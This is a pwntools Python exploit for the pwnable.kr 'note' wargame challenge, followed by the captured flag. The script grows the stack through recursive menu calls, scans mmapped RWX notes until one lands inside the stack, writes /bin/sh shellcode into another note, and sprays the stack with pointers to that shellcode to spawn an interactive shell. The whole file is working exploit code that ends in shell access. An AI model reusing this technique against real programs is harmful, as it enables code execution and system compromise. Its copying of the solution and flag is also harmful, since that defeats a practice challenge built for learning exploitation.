#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './note')
loader = ELF('./loader')

# ----------------- #
# Config / defaults #
# ----------------- #
context.log_level = "info"
REMOTE_USER = "note"
REMOTE_HOST = "pwnable.kr"
REMOTE_SSH_PORT = 2222
REMOTE_NC_CMD = "nc 0 9019"

### defines ###
MASK_ADDR = 0xffff0000

### globals ###
stack_ranges = [0xffbcd000, 0xffffe000]

def start_ssh_nc(user: str, host: str, ssh_port: int, nc_cmd: str,
                 keyfile: str = None, password: str = None):
    log.info(f"ssh -> {user}@{host}:{ssh_port} ; running: {nc_cmd}")
    ssh_client = ssh(user, host, port=ssh_port, keyfile=keyfile, password=password)
    io = ssh_client.run(nc_cmd, tty=True)
    io.ssh_client = ssh_client
    return io

def start_local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([loader.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([loader.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

### helpers ###
def mask_address(addr: int):
    return addr & MASK_ADDR

### wrappers ###
def option(io: process, op: int):
    io.sendlineafter("- Select Menu -", str(op))

def create_note(io: process):
    option(io, 1)
    io.recvuntil('[')
    addr = eval(b'0x' + io.recvuntil(']')[:-1])
    log.info(f"New mmap addr = {hex(addr)} | RXW | size = 0x1000")
    return addr

def delete_note(io: process, idx: int):
    option(io, 4)
    io.sendlineafter("note no?", str(idx))

def write_note(io: process, idx: int, data: str):
    option(io, 2)
    io.sendlineafter("note no?", str(idx))
    io.sendlineafter("paste your note (MAX : 4096 byte)", data)

def stack_grow(io: process):
    for i in range(0x1000):
        io.sendline("6") # Invalid option so the menu func will do a recursive call to itself.

def main():
    global mmaps

    exe_path = args.EXE or "./loader"
    use_ssh = args.SSH
    keyfile = args.KEY or None
    password = args.PASSWORD or 'guest'
    use_gdb = args.GDB
    use_local_flag = args.LOCAL
    if use_ssh:
        io = start_ssh_nc(REMOTE_USER, REMOTE_HOST, REMOTE_SSH_PORT, REMOTE_NC_CMD,
                          keyfile=keyfile, password=password)
    else:
        io = start_local()

# -- Exploit goes here --    
    #gdb.attach(io)
    io.recvuntil("I think security people will thank me for this :)")
    
    log.info("Start stack grow...")
    stack_grow(io)
    log.info(f"Now stack memory is large enough! - size = {hex(stack_ranges[0] - stack_ranges[1])}")

    log.info("Start search for arbitrary address on the stack...")
    addr = 0
    i = 0
    while True:
        i += 1
        addr = create_note(io)

        if addr > stack_ranges[0] and addr < stack_ranges[1]:
            log.info(f"Address found! at - {hex(addr)}")
            break
            
        if i % 100 == 0:
            log.info(f"Scan {i} addresses...")
        delete_note(io, 0)

    exec_mem = create_note(io)
    write_note(io, 1, asm(shellcraft.sh()))

    log.info("Spray the stack with pointers to the shellcode...")
    write_note(io, 0, p32(exec_mem) * ((stack_ranges[1] - addr) // 8))
    log.info("Finished!")
    option(io, 5)

    io.interactive()

if __name__ == "__main__":
    main()

#flag: fy1_mmap_s_st4nds_f0r_mmap_stup1d
